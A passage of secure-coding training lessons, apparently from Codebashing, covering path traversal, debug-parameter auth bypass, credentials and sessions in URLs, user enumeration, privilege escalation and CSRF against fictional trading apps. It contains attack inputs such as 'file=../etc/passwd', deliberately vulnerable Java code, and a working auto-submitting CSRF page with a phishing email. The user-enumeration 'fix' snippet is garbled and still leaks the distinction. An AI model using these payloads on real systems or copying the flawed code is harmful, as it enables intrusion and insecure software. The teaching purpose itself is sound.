+Here, we’ve learned that writing secure code to* protect against DOM XSS is a more difficult task* than writing secure code to prevent Persistent XSS and Stored XSS attacks, due to the much larger attack surface with DOM XSS. +
+We’ve also learned that the application should *first HTML-encode* and *then JavaScript-encode any user-supplied (or otherwise untrusted) data* to improve the security posture against DOM XSS.
+
+=== Insecure Direct Object References
+
+==== Directory (Path) Traversal
+
+*Directory (Path) Traversal* is an application vulnerability that allows an attacker to access directories and  files that are stored outside the web root folder. This type of vulnerability is found in applications that make insecure references to files based on user supplied input. A classic example is manipulating file location input variables with “dot-dot-slash (../)” sequences and its variations, to access arbitrary files and directories of the server's file system, such as sourcecode or password files, or other sensitive files.
+
+The vulnerable application pane loads the TradeRESEARCH application, an online financial research application for traders that allows them to view the latest news and research articles related to their portfolio and trading strategies.
+
+Alice is a trader and authorized user of the TradeRESEARCH system. She has just loaded the application in her web browser.
+
+The vulnerable application pane loads the TradeRESEARCH application, an online financial research application for traders that allows them to view the latest news and research articles related to their portfolio and trading strategies.
+
+Alice is a trader and authorized user of the TradeRESEARCH system. She has just loaded the application in her web browser.
+
+As expected, the full article opens in Alice's browser.
+Let us further analyze the URL returned by the server, https://traderesearch.codebashing.com/trade_news?file=5543 +
+It ends with the following query string: `file = 5543`
+
+TradeRESEARCH analysts draft financial research reports that are then uploaded as flat HTML files to the /tmp directory.
+
+Let us study the source code used for serving these files to TradeRESEARCH users like Alice.
+
+.Vulnerable code
+[source,java]
+----
+public void doGet(HttpServletRequest request, HttpServletResponse response) {
+​
+  String result;
+  String filename = request.getParameter("file");
+​
+  try {
+     File file = new File("/tmp/" + filename);
+     BufferedReader reader = new BufferedReader(new FileReader(file));
+     String line = null;
+     while((line = reader.readLine()) != null) {
+        result += line;
+     }
+​
+  } catch (Exception e) {
+     e.printStackTrace();
+  }
+  try {
+     response.getWriter().write(result);
+  } catch (IOException e) {
+     e.printStackTrace();
+  }
+}
+----
+
+To load the contents of a research report, the `request.getParameter()` method is first called to extract file value (from the HTTP request parameter) which is then assigned to the `filename` variable.
+The `filename` variable is then passed to Java's `File()` method, which creates a File instance represented by the file pathname. In Alice's example the path name is set dynamically by appending the filename to our directory path `/tmp/` which translates to `/tmp/` filename
+
+Note that the research analysts save their research as HTML flat files in the `/tmp` directory with a standardized file naming convention e.g. 5543 , 5544 , 5545 etc
+
+The contents of this file are then read by the `while()` loop and stored in the string variable `result`
+
+Finally, the result string is sent back as a response via the `response.getWriter().write(result)` code block which finally gets rendered within Alice's browser.
+
+Based on what we have just seen in the source code, *it doesn't look like the application validates user-supplied input* that determines which file the application should read and then serve to the requesting user.
+
+Alice decides to *tamper with the parameter fields* by changing the file value from the article number to the following:
+
+    file=../etc/passwd
+
+In fake browser, modify the URL by appending the `../etc/passwd` string as the argument for the file parameter, so that the final URL is :
+
+    https://traderesearch.codebashing.com/trade_news?file=../etc/passwd
+
+Interesting! Alice has just managed to access TradeRESEARCH's /etc/passwd file by simply appending `../etc/passwd` string to the file input !
+
+The ability to traverse file paths and load arbitrary files from the system is called the Directory Traversal (or Path Traversal) attack. Let us now analyze the vulnerable code to understand how the attack was triggered at a code level.
+
+To quickly recap, the `request.getParameter()` method is first called to extract the file value (from the HTTP request parameter) which is then assigned to the `filename` variable.+
+However, note that *no input validation is performed on the `filename` variable*, which is directly concatenated with the `/tmp` path. +
+Therefore, by injecting the dot dot slash ( ../ ) characters within the filename variable, Alice is able to traverse the web server's directory structure and access files outside the original `/tmp` folder path. This type of directory/folder subversion is also know as a directory traversal attack.
+
+====== Remediation
+
+As with any user-supplied input, it is important to *ensure that there is a context-specific input validation strategy* in place.
+
+In the case of the TradeRESEARCH application, an obvious solution would be to, first, *canonicalize the full path name* and then to validate that the canonicalized path is in an *intended/allowed directory* on the file system.
+
+Let us see how the above recommendation can be applied to our vulnerable example to remediate the Directory Traversal vulnerability.
+
+.Remediation
+[source,java]
+----
+public void doGet(HttpServletRequest request, HttpServletResponse response) {
+​
+  String result;
+  String filename = request.getParameter("file");
+​
+  try {
+     File file = new File("/tmp/" + filename);
+     String canonicalPath = file.getCanonicalPath();
+     if(!canonicalPath.startsWith("/tmp/")) {
+       throw new GenericException("Unauthorized access");
+     }
+      BufferedReader reader = new BufferedReader(new FileReader(file));
+     String line = null;
+     while((line = reader.readLine()) != null) {
+        result += line;
+     }
+​
+  } catch (Exception e) {
+     e.printStackTrace();
+  }
+  try {
+     response.getWriter().write(result);
+  } catch (IOException e) {
+     e.printStackTrace();
+  }
+}
+----
+
+In our updated code fix, we make use of Java's `getCanonicalPath()` method which gets the full path string of Alice's file parameter by resolving the files relative path against the current directory, and further removes any relative pathing characters such as ./ and ../ +
+Finally, the path string returned by `getCanonicalPath()` method is checked by Java's `startsWith()` method to ensure that Alice's file path begins with the `/tmp` path string. Should this check fail, the application will raise an `Unauthorized access` error and return, thus preventing Alice from loading files outside the `/tmp` directory structure.
+
+=== Security Misconfiguration
+
+==== Privileged Interface Exposure
+
+*Privileged Interface Exposure* is a type of application weakness whereby a privileged (administration) interface is accessible to regular (low-privileged) users of the system. Because administration interfaces are only used by trusted administrator users, they are often overlooked from a security perspective. When exposed to the public Internet a malicious attacker could use the interface to her advantage. 
+
+The vulnerable application pane loads the TradeMASTER application, an online trading platform. Registered users of the system can login to buy and sell stocks, bonds and currencies. Alice is a trader and registered (legitimate) user of the application.
+
+Let's analyze the URL returned by the TradeMASTER application:
+
+    https://trademaster.codebashing.com/trade_station?type=user
+
+Notice that URL end's with the following query string: `trade_station?type=user`
+
+Alice notices the `trade_station?type=user` query string in her web browser's address bar and decides to tamper with the parameter fields by changing the value from user to the following:
+
+    1. type=test
+    2. type=bob
+    3. type=admin
+
+Interesting ! By simply changing the type parameter value to *admin* , Alice was able to access a legacy administrative console on TradeMASTER.
+
+Note, that this was not a software or code issue but a simple misconfiguration change which was released in production !
+
+Although Alice does not have access to TradeMASTER's administrative credentials, the exposure of a sensitive system component can provide an additional attack surface for a malicious user to exploit.
+
+For example, Alice could mount a password brute force attack against the legacy admin web console or attempt discovering SQL injection / Cross Site Scripting vulnerabilities.
+
+Web application misconfigurations are a dangerous attack vector, since they can lead to the the entire system being compromised. These issue may occur due to default accounts, default pages and unprotected directories being enabled, which may contain sensitive information or provide additional attack interfaces for a potential attacker to investigate.
+
+As a general rule of thumb, *always make sure to remove legacy content such as administrative interfaces, unused business logic or any application methods that were enabled for test and development purposes*.
+
+Additionally, *all default web packages, scripts and manuals that are installed by default must be removed before deploying a business system in the production environment*.
+
+==== Leftover Debug Code
+
+A common development practice is to add "back door" code specifically designed for debugging or testing purposes that is not intended to be shipped or deployed with the application. When this sort of debug code is accidentally left in the application, the application is open to unintended modes of interaction. These back door entry points create security risks because they are not considered during design or testing and fall outside of the expected operating conditions of the application.
+
+Bob is an attacker and has access to the TradeTECH website. However, he does not have valid access credentials to log in as an authorized user. Bob decides to search for weaknesses that will allow him to get unauthorized access. +
+Bob starts from inspecting the HTML source for TradeTECH's login page to look for any clues that might help him.
+
+[source,html]
+----
+<div class="loginInput">
+<input type="text" class="variable" name="email" id="variable1"/>
+</div>
+​
+<div class="loginInput">
+<input type="password" class="variable" name="password"  id="variable2"/>
+</div>
+<!-- FIXME - For QA/Testing environment,append ?debug=1 flag within the URL to access the application without authentication. -->
+<div class="loginControl">
+<input type="submit" value="Log Me In" class="dredB logMeIn" id="btnStatus"/>
+</div>
+----
+
+Browsing through TradeTECH's HTML source, Bob notices that the login web page contains an HTML comment that was unintentionally shipped into the production instance of the TradeTECH web application. +
+Upon further inspection of this comment, it appears that TradeTECH developers have implemented functionality to bypass the authentication mechanism, in order to help QA teams run their test cases unobtrusively and without the additional overhead of authenticating each time.
+
+By simply appending the query string `?debug=1` , a user can completely bypass the authentication mechanism and obtain access to the TradeTECH application!
+
+Now that Bob has found the hidden debugging parameter, he tries to exploit this application functionality by appending the query string ?debug=1 to TradeTECH's default login URL +
+In fake browser, modify the URL by appending the string ?debug=1 so that the final URL is:
+
+    https://tradetech.codebashing.com?debug=1
+
+Interesting! Bob managed to access TradeTECH's administrator web page by simply appending `?debug=1` query string to the URL!
+
+But how did Bob manage to bypass the authentication end even get access to the administrative interface? Let us analyze the vulnerable server-side code to understand how this attack was triggered at a code level.
+
+[source,java]
+----
+/* Authentication Code Snippet */
+​
+Boolean isAuthenticated = false;
+HttpSession session = request.getSession(true);
+​
+if (request.getParameter("debug") != null && request.getParameter("debug").equals("1"))
+{
+   session.setAttribute("username", "admin");
+   session.setAttribute("isAdmin", "true");
+   isAuthenticated = true;
+}
+----
+
+In the following code snippet, the `request.getParameter()` method is first called to test if debug parameter is present within the URL query string. +
+Additionally, a check is performed to test if the `debug` parameter is set to 1
+
+Should the previous if block condition return true the setAttribute method is called on line 9 and 10 to update the users session (in this case Bob) , specifically `username` is set to `admin` and `isAdmin` is set to `true`
+
+Finally, the boolean variable `isAuthenticated` is set to true which indicates that the current session is authenticated, thus allowing a legitimate QA / Tester to bypass TradeTECH's authentication logic.
+
+Unfortunately, no configuration checks are implemented to ensure that this code block is automatically disabled for non QA / Test environments, thereby allowing unauthorized users like Bob to bypass authentication within TradeTECH's "Production" instance.
+
+==== Remediation
+
+In web-based applications, debug code is helper functionality, used for testing and modifying web application properties, configuration information, and functions. If debug functionality is left on a production system, this will give attackers a chance to use it for bad.
+
+Do not leave debug statements that could be executed in the source code. Ensure that all debug functionality and information is removed as a part of the production build process. Remove debug code before deploying the application.
+
+Further, *leftover comments from the development process can reveal to would-be attackers potentially useful information* about the application's architecture, its configuration, version numbers, and so on, so please ensure these are removed too.
+
+=== Sensitive Data Exposure
+
+==== Authentication Credentials in URL
+
+*Insecure Logging* is a type of application security vulnerability whereby the application is configured to either *log sensitive data to log files* (such as personally identifiable information, payment card information, or authentication credentials etc). Furthermore, if the application is not correctly validating user-supplied input that is then stored in logs, an attacker is able to maliciously manipulate log files.
+
+The vulnerable application pane loads the TradeBOND application, an online trading platform that allows trading corporate bonds. +
+Alice who is an authorized trader of the TradeBOND system has loaded the application in her web browser.
+
+The LIVE LOG window displays TradeBOND's Apache web server log file. +
+Note that TradeBOND's apache log file is configured to log standard HTTP GET and POST requests.
+
+As Alice try logging in to the application a few times, try and guess her password a few times.
+
+Keep your eye on the Live Log window, which is showing the backend web server’s log file in real time with the `tail –f webserver.log` command. You will notice that the GET requests are being logged here.
+
+This means that a system administrator, web server administrator, or back-up administrator, or user with access to the log file would have access to the usernames and passwords for users of the application.
+
+Furthermore, if the application was (insecurely) sending the login GET request via the unencrypted HTTP rather than HTTPS the credentials would also be visible to any upstream proxy!
+
+.Live log examples
+[source]
+----
+GET 200 https://tradebond.codebashing.com/site_log_in?email=kevin&password=dark
+
+GET 200 https://tradebond.codebashing.com/site_log_in?email=admin&password=admin
+----
+
+Applications should be configured to *only accept login parameters* (e.g. A username and password pair, or other authentication material) *via a form submitted within a POST request*. This rule applies to any sensitive user-supplied data.
+
+*Transmitting login credentials via GET requests is never a good idea* because URLs are inevitably stored in multiple places that an application developer has no control over. When the Login Credentials are present within the URL, and that URL is stored, it increases the likelihood of inadvertent login credential exposure. For instance, URLs are commonly stored in:
+
+    1. Browser history
+    2. Browser bookmarks
+    3. Referrer headers when resources are linked
+    4. Upstream proxy logs
+    5. Web application logs
+
+Note also that to further protect sensitive user-supplied data, *the application should only accept communication from a logged-in user over HTTPS*, and *never over HTTP*.
+
+==== Session Exposure Within URL
+
+*The most common flaw is simply not encrypting sensitive data*. When crypto is employed, weak key generation and management, and weak algorithm usage is common, particularly weak password hashing techniques. Browser weaknesses are very common and easy to detect, but hard to exploit on a large scale. External attackers have difficulty detecting server side flaws due to limited access and they are also usually hard to exploit.
+
+The vulnerable application pane loads the TradeLOGIC application, an online trading platform. Registered users of the application can log in to buy and sell stocks, bonds, and currencies.
+
+Alice is an authorized trader in the TradeLOGIC system. She has just opened the application in her web browser.
+
+Let us analyze the URL returned by the server:
+
+    https://tradelogic.codebashing.com/tradelogic/log-in?app_session_id=a5e036d9e646d0aa29bab72dcf4c93a6
+
+The web application has assigned Alice a *unique session identifier* also known as a *session cookie*. In this example, Alice's session cookie is the following: `a5e036d9e646d0aa29bab72dcf4c93a6`
+
+Alice tries to log in to the application with the following credentials:
+
+    * Username: alice@bank.com
+    * Password: alice123
+
+While Alice is logging in, keep an eye on the Live Log pane where the backend webserver access logs for this application are displayed.
+
+.Live Log
+[source]
+----
+POST 302 /tradelogic/log-in?app_session_id=a5e036d9e646d0aa29bab72dcf4c93a6 redirect_to=https://tradelogic.codebashing.com/tradelogic/log-in?app_session_id=a5e036d9e646d0aa29bab72dcf4c93a6
+
+GET 200 https://tradelogic.codebashing.com/tradelogic/log-in?app_session_id=a5e036d9e646d0aa29bab72dcf4c93a6
+----
+
+As you can see, when Alice logs in to the application, *her unique Session Udentifier gets automatically recorded in the backend web server log file*, thereby allowing other users to access her session information.
+
+Another reason to *not transmit Session Identifiers via GET request but only via POST request* is that a user can accidentally share his own session with others when copy-pasting web links to another application.
+
+Consider that Alice shares a link to the application on Twitter:
+
+    https://tradelogic.codebashing.com/tradelogic/myprofile?app_session_id=a5e036d9e646d0aa29bab72dcf4c93a6
+
+If Alice is currently logged in to the application, then any follower that clicks this link becomes logged in as Alice!
+
+Another reason why *transmitting session identifiers via GET requests* is *not a good idea* is that URLs can be *stored in multiple places* that an application developer has no control over. When the session identifier is specified within the URL, and this URL is stored somewhere, it increases the likelihood of accidental session identifier exposure which is the first step to session hijacking.
+
+For instance, URLs are commonly stored in:
+
+    1. Browser history
+    2. Browser bookmarks
+    3. Referrer headers
+    4. Upstream proxy logs
+    5. Web application logs
+    6. Wireless Access Points
+    7. Routers
+
+Ensure that *session identifiers* are not transmitted to the application via GET requests, *only via POST requests*. +
+To further protect the session identifier, the application should only accept communication from a logged-in user over *HTTPS*, and never over HTTP.
+
+Why does sending a session identifier in the URL pose a security risk?
+
+    * The URL is saved in multiple locations on its way, thus the session ID can be disclosed
+
+==== User Enumeration 
+
+*User Enumeration* is a type of application security vulnerability whereby the vulnerable web application reveals whether a username (email address or account name) exists or not, this can be a consequence of a misconfiguration or a design decision. The information obtained via user enumeration can then be used by an attacker to gain a list of users on system. This information can  be used to further attack the web application, for example, such as through a brute force credential guessing attack.
+
+The vulnerable application pane loads the TradeBROKER application, an online brokerage platform.
+
+Bob is an unauthorized user, he does not have a valid username and password to the application.
+
+-> Take the role of Bob and type in any username and any password then click the SIGN IN button.
+
+The login attempt failed, the username or password was invalid.
+
+Bob doesn't know the username or password of any valid users and decides to explore the *forgotten password* function.
+
+The forgotten password functionality allows a user reset his or her password. If a valid user's email address is entered, an email is then sent with instructions on how to reset the password.
+
+Bob tries using this feature to submit the following email addresses:
+
+    1. jim@bank.com
+    2. bob@bank.com
+    3. alice@bank.com
+
+1. As Bob try submitting the above email addresses.
+2. Observe the status message returned by the application upon each forgotten password submission.
+
+Interesting. The last email, belonging to Alice, resulted in a success message, whilst the (non-existent users, Jim and Bob) resulted in a failure message. +
+When it is possible to *determine whether a user name is valid or not*, it is known as a *Username Enumeration vulnerability*.
+
+NOTE: 'Username Enumeration' can exist in other areas of an application, not just within a 'Forgotten Password' function.
+
+.Vulnerable code
+[source,html]
+----
+//
+// The following is a code snippet illustrating a user enumeration vulnerability in Java
+//
+​
+<c:choose>
+    <c:when test="${statusCode === 'emailNotFound'}">
+        <div id="reminder-message">We are unable to find an account matching the email address you entered. Please contact an administrator.</div>
+    </c:when>
+    <c:when test="${statusCode === 'emailFound'}">
+        <div id="reminder-message">A reminder email has been sent to this user.</div>
+    </c:when>
+</c:choose>
+----
+
+In order to generate the TradeBROKER "Forgotten Password" status page, the application developers have used the JSP Standard Templating Library (JSTL) which provides standard actions and methods for formatting HTML.
+
+To display the correct "error" or "success" password reminder message, the `c:when` test expression is called to evaluate the status code ( emailNotFound or emailFound ) returned by the application controller.
+
+Unfortunately, the developers have used a verbose message detailing the reason for a nonexistent username, which can be exploited by a user ( Bob ) to enumerate users registered on the TradeBROKER system.
+
+Addressing this specific issue is straightforward, a simple change to the application to return the following message (whether or not the user exists) would suffice:
+
+    "A forgotten password reminder email has been sent to the address on file (if the username is valid). Please check your emails."
+
+Let's take a look at the fixed code.
+
+.Remediation
+[source,html]
+----
+// The following is a code snippet illustrating a user enumeration vulnerability in Java
+//
+​
+<c:choose>
+    <c:when test="${statusCode === 'emailNotFound'}">
+        <div id="reminder-message">We are unable to find an account matching the email address you entered. Please contact an administrator.</div>
+                <div id="reminder-message">A reminder email has been sent to this user.</div>
+    //    </c:when>
+    <c:when test="${statusCode === 'emailFound'}">
+        <div id="reminder-message">A reminder email has been sent to this user.</div>
+    </c:when>
+</c:choose>
+----
+
+Looking at our modified error response text, we have successfully remediated the user enumeration vulnerability by *ensuring that the application responds with the same error message and length regardless of if the user is unregistered or present* on the TradeBROKER application.
+
+Some application has login and password forms for authenticating users. The application returns "The user doesn't exist" in case the username doesn't exist and "Wrong password" if the username exists and the password is wrong. Is the application vulnerable?
+
+    * Yes! Verbose errors allow the attacker to enumerate usernames and run further attacks on existing users
+
+=== Missing Function Level Access Control
+
+==== Horizontal Privilege Escalation
+
+*Horizontal Privilege Escalation* is an application vulnerability that *allows one (normal) User of an application to create, read, update and/or delete the data belonging to another (normal) User*. This type of vulnerability is often the result of errors in the authorization logic.
+
+The vulnerable application pane loads the TradeJOB application, an online trading platform. Registered users of the application can log in to buy and sell stocks, bonds, and currencies. Bob is a trader and registered (but malicious) user of the TradeJOB application.
+
+The TradeJOB developers have implemented the *Edit Profile feature*, allowing users to customize and update their user profile information.
+
+Bob decides to update his personal details, so he clicks the *Edit Profile* button to open his profile page.
+
+Let us analyze the URL returned by the TradeJOB application for updating Bob's user profile:
+
+    https://tradejob.codebashing.com/trade_job/edit_profile?uid=1000750
+
+Notice that the URL end's with the following string: `uid=1000750`.
+
+Before we proceed with our Horizontal Privilege Escalation attack, let us first analyze the TradeJOB's source code, specifically the Edit Profile functionality used to update the user profile.
+
+.Vulnerable code
+[source,java]
+----
+protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+​
+    String uid = request.getParameter("uid");
+    ​
+    PreparedStatement qUser = null;
+    String qString = "select * from users where userid = ?";
+    ​
+    qUser=conn.prepareStatement(qString);
+    qUser.setString(1,uid);
+    ResultSet user = qUser.executeQuery();
+    ​
+    while(user.next())
+    {
+        request.setAttribute("name",user.getString("name"));
+        request.setAttribute("email",user.getString("title"));
+        request.setAttribute("phone",user.getString("email"));
+        request.setAttribute("institute",user.getString("phone"))
+    }
+    ​
+    request.getRequestDispatcher("/WEB-INF/templates/edit_profile.jsp").forward(request, response);
+}
+----
+
+To implement the "Edit User" functionality, the `doGet()` method extracts a logged-in user's uid value by invoking `request.getParameter()` method, which is then assigned to the uid string variable.
+
+The variable `qString` is then declared, which represents the SQL query used to lookup a user's (Bob) profile information. +
+Note, that Bob's `uid` value is passed as a parameterized query on line 9 using the `setString` method.
+
+The SQL statement is then executed by invoking the `executeQuery` method. This method executes our query against the back end SQL server and returns a `ResultSet` object containing the user's (Bob's) profile information.
+
+Finally, the `getRequestDispatcher()` method is invoked on line 20 and the user is redirected to their edit profile web page.
+
+Bob notices the `edit_profile?uid=1000750` query string in the address bar and decides to tamper with the parameter fields by changing the value of uid from 1000750 to the following:
+
+    1. uid=1000775
+    2. uid=1000800
+
+Interesting! Bob managed to get access to Alice's profile by simply changing the uid value to 1000800 in the URL! +
+Let us further analyze the vulnerable server-side code to understand how this attack was triggered at a code level.
+
+In the previous code, unfortunately, the SQL statement used to fetch Bob's profile *does not perform any authorization / user context awareness checks* and further allows direct referencing of objects via the uid parameter. +
+This means that a malicious user can simply manipulate the uid variable to *access other objects (user profiles) within the application without proper authorization*. +
+This is also known as an *"Insecure Direct Object Reference"* (IDOR) attack.
+
+====== Remediation
+
+In our example, a simple point-and-fix solution is not to rely on the user-supplied data when performing authorization checks. Although the example presented in this lesson can seem unrealistic, this type of vulnerability is still seen in production web applications.
+
+Depending on the nature of the application, authorization models can vary in complexity. *Common role-based access control models* include:
+
+    1. Groups > Users
+    2. Groups > Users > Permissions
+
+For the general case, it is critical to consistently check that any user CRUD operation is authorized, and authorization is performed according to the well-defined access control model.
+
+However, if you must expose direct references to database structures, ensure that *SQL statements* and other database access methods *only allow authorized records to be displayed*. This can be achieved by adding context awareness to the SQL query so that it filters out only profile information that the user has permissions to access.
+
+.Remediation
+[source,java]
+----
+protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
+​
+    String uid = request.getParameter("uid");
+    String currentUser = request.getUserPrincipal().getName();
+    ​
+    PreparedStatement qUser = null;
+    //String qString = "select * from users where userid = ?";
+    String qString = "select * from users where userid = ? and username = ?";
+    qUser=conn.prepareStatement(qString);
+    qUser.setString(1,uid);
+    qUser.setString(2,currentUser);
+    ResultSet user = qUser.executeQuery();
+    ​
+    while(user.next())
+    {
+        request.setAttribute("name",user.getString("name"));
+        request.setAttribute("email",user.getString("title"));
+        request.setAttribute("phone",user.getString("email"));
+        request.setAttribute("institute",user.getString("phone"))
+    }
+
+    request.getRequestDispatcher("/WEB-INF/templates/edit_profile.jsp").forward(request, response);
+}
+----
+
+In our modified code example, we first extract the current logged in users security / authorization context (username) by invoking the `getUserPrincipal().getName()` method, which is assigned to the `currentUser` string variable.
+
+Note that `currentUser` variable will be used as our authorization context variable.
+
+Finally, we pass `currentUser` as an additional parameter to our modified SQL query, which will perform an additional context check (via the username) field, ensuring *only the current logged in users profile is loaded* by the application server.
+
+==== Vertical Privilege Escalation
+
+*Missing Function Level Access Control* is an application vulnerability that allows either an Anonymous User or Legitimate User of the application to access the create, read, update and/or delete functionality belonging to another user of the application. This example we show how Vertical Privilege Escalation is a potential outcome of this vulnerability.
+
+The vulnerable application pane loads the TradeSOCIAL application, an online trading platform. Registered users of the application can log in to buy and sell stocks, bonds, and currencies.
+
+Bob is a trader and registered (but malicious) user of the TradeSOCIAL application.
+
+The TradeSOCIAL developers have implemented the Manage Profile feature, allowing users to customize and update their user profile information. Bob decides to update his user profile and clicks the Manage Profile button to start editing.
+
+Let us analyze the URL returned by the TradeSOCIAL application for updating Bob's user profile:
+
+    https://tradesocial.codebashing.com/trade_social/user/show 
+
+Note that it ends with the following string: `user/show`.
+
+Bob decides to tamper this URL, hoping to access potentially restricted features within the TradeSOCIAL application. +
+He does this by replacing the keyword user with admin resulting in the following URL:
+
+    https://tradesocial.codebashing.com/trade_social/admin/show
+
+Interesting! Bob managed to get *access to TradeSOCIAL's administrator web page* by simply changing the user keyword to admin in the URL!
+
+Let us further analyze the vulnerable server-side code to understand how the attack was triggered at a code level.
+
+.Vulnerable code
+[source,java]
+----
+public class GetAllUsers extends HttpServlet implements Servlet
+{
+​
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
+    {
+        Subject currentUser = SecurityUtils.getSubject();
+        String url = "/login.jsp";
+        // Return full list of users
+        if (currentUser.isAuthenticated())
+        {
+            url = "/admin/show.jsp";
+            List<User> userList = UserDAO.getAllUsers();
+            request.setAttribute("userList", userList);
+        }
+        RequestDispatcher dispatcher = getServletContext().getRequestDispatcher(url);
+        dispatcher.forward(request, response);
+    }
+}
+----
+
+As part of TradeSOCIAL's administrative interface functionality, the developers have implemented the `GetAllUsers` class, which implements a method to list all registered application users.
+
+To implement this functionality, the `doGet()` method firstly extracts the current user by invoking `getSubject()` method, which returns the currently logged in user ( Bob )
+
+An access control check is then performed by the if block on line 9 (via `isAuthenticated()` method). Should this check pass, a list of all users is returned via the `getAllUsers()` method on line 12
+
+Unfortunately, the application developers have failed to incorporate a correct authorization check, to ensure that the user is *not only authenticated*, but *also authorized with "admin" privileges* (role), thereby allowing an unprivileged user ( Bob ) to access TradeSOCIAL's administrative console.
+
+====== Remediation
+
+In our example, a simple point-and-fix solution is to ensure that the user is not just authenticated, but also has the correct role to access the administrative functionality.
+
+However, the larger and more complex an application is, the greater is the probability of even a single *missed authorization check*. For this reason, a *pattern-based approach to ensuring authorization* across any application should be consistently applied.
+
+To make life easier, many frameworks provide built-in functionality to assist with this. For instance, *Java Spring Framework* provides support for *Expression-Based Access Control with the `hasRole([role])` expression*.
+
+Furthermore, in *version 3.0 Spring Security framework* added *Method Security Expressions* which introduced additional *annotations*, including `@Pre` and `@Post` annotations.
+
+In the example below, access to the method will only be allowed for users with the role "ROLE_USER”:
+
+[source,java]
+----
+@PreAuthorize("hasRole('ROLE_USER')")
+public void create(Contact contact);
+----
+
+.Remediation
+[source,java]
+----
+public class GetAllUsers extends HttpServlet implements Servlet
+{
+​
+    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException
+    {
+        Subject currentUser = SecurityUtils.getSubject();
+        String url = "/login.jsp";
+        // Return full list of users
+     if (currentUser.isAuthenticated() && currentUser.hasRole("admin"))
+    //        if (currentUser.isAuthenticated())
+        {
+            url = "/admin/show.jsp";
+            List<User> userList = UserDAO.getAllUsers();
+            request.setAttribute("userList", userList);
+        }
+        RequestDispatcher dispatcher = getServletContext().getRequestDispatcher(url);
+        dispatcher.forward(request, response);
+    }
+​
+}
+----
+
+In our updated code fix, we make use of *Java Spring framework's `hasRole()`* method which returns true if the current user has the specified role, ensuring that the user ( Bob ) must first pass both authentication and authorization checks to access TradeSOCIAL.
+
+What is an example of the vertical privilege escalation in a web application?
+
+    * Gaining access to the administrative interface of a web application, using a user account that does not have any administrative privileges +
+    Vertical privilege escalation means that the attacker gets access to the application's functionality that requires special privileges. For example, when a regular user gets access to the user management functionality that only the admin should be able to access.
+
+=== Cross-Site Request Forgery
+
+==== Cross Site Request Forgery (POST)
+
+*Cross-Site Request Forgery (CSRF)* is an application security vulnerability  that permits an attacker to force another logged-in user of the application to perform actions within that application without realising. The classic example is Bob and Alice both being logged-in users of an online banking application, and Bob tricks Alice into making a funds transfer to Bob's account with CSRF. Importantly, in CSRF attacks the attacker does not have a direct mechanism for seeing the application's response to the victim.
+
+The vulnerable application pane loads the TradeIDEA application, an online platform that allows for the creation and sharing of trading strategies.
+
+Alice is a trader and authorized user of the TradeIDEA system. She opens the application in her web browser.
+
+Go ahead and create the following three trade ideas:
+
+    1. Trade TRV given Oil is up to $90
+    2. SELL SSW short if it goes over $30
+    3. AWW, NSD and TRE at an all time low - BUY
+
+The developers of TradeIDEA have recently enabled a new *Delete All feature* that allows for bulk deletion of trade ideas. Before we continue with the exercise, let us analyze this feature in more detail.
+
+[source,html]
+----
+//
+// HTML codebehind for "Delete All" button
+//
+​
+<form action="/ideas/delete_all" method="post">
+  <input type="hidden" name="scope" value="all">
+  <button class="button redB" id="delete_button" style="margin: 5px;">Delete All</button>
+</form>
+----
+
+The *Delete All* action is defined as an HTML `form` tag, which submits a POST HTTP request to TradeIDEA's `/ideas/delete_all` URL resource. +
+An additional `input` tag is declared to pass the query parameter `scope` with the value `all` as part of this POST request. +
+Finally an HTML `button` tag is declared to submit the Delete All `form` with the query parameter `scope=all`
+
+Bob is an attacker. He has just discovered a CSRF vulnerability within the TradeIDEA application. +
+To exploit the vulnerability, Bob registers a domain called *fake-research.codebashing.com* to host a malicious web page.
+
+Let us quickly analyze the HTML source for Bob's malicious web page before proceeding with the CSRF attack.
+
+.Malicious code
+[source,html]
+----
+<html>
+<body>
+​
+<p>We are experiencing some technical problems. Our website is expected to be back online shortly. We apologize for the inconvenience.</p>
+​
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='https://tradeidea.codebashing.com/ideas/delete_all' target="csrf-frame" id="csrf-form">
+  <input type='hidden' name='scope' value='all'>
+</form>
+<script>document.getElementById("csrf-form").submit()</script>
+​
+</body>
+</html>
+----
+
+Browsing through Bob's malicious HTML, we notice that the web page is programmed to display a fake "Server Downtime" message, which an unsuspecting victim will believe to be a genuine website issue. +
+Bob has also declared an `iframe` within his malicious web page that has been styled using the CSS property `display: none` to *ensure that the iframe is not visible* once Alice has loaded Bob's malicious web page.
+
+NOTE: We will learn later in the exercise why this iframe is needed for Bob's CSRF attack to work.
+
+Finally Bob has declared an HTML `form` tag that submits a POST HTTP request to TradeIDEA's `delete_all` method. +
+Notice the javascript code on line 10. Any guesses on what this code might do ?
+
+Bob then writes a malicious email to Alice, asking her to check out the new financial research portal.
+
+----
+Hi Alice!
+
+Following our conversation on Tuesday, sending you the link to that cool financial news portal that my colleagues shared with me. This is definitely the best source of the latest news from business and industry experts!
+
+    https://fake-research.codebashing.com
+
+Kind Regards,
+Bob
+----
+
+Alice would normally ignore unsolicited emails, but because the information looks relevant to her, she decides to follow Bob's link.
+
+After the malicious web page opens in her browser, Alice notices that the fake-research.codebashing.com portal is offline for maintenance. +
+She decides to revisit the portal later and goes back to the TradeIDEA web site.
+
+Interesting ! All Alice's saved trade ideas have suddenly disappeared after she visited Bob's malicious site. But how did that happen? +
+Let us re-visit the source code of Bob's malicious website to find out.
+
+When Bob's malicious web page is loaded by Alice, the javascript method `submit()` is run against the HTML form declared on line 7
+
+Note that the `submit()` method performs the *same action as clicking the "Submit" button* within an HTML form
+
+Upon submitting this form, *Alice's browser generates an HTTP POST request* to TradeIDEA's `/ideas/delete_all` resource.
+
+Given that Alice has already been authenticated to TradeIDEA, the *Delete All* action invoked by Bob's web page is seen as a legitimate request made by Alice, thus deleting all her saved trade ideas.
+
+However, by calling `submit()` on TradeIDEAS's *delete_all* resource, Alice will automatically be redirected to TradeIDEA's web page, raising suspicion about Bob's email.
+
+This is where the `iframe` tag comes handy. *By creating a hidden iframe, Bob's `submit()` method will post the form against this static iframe*, thereby ensuring *Alice never gets redirected to TradeIDEA*. Instead, she will only see the "Server Downtime" message.
+
+====== Remediation
+
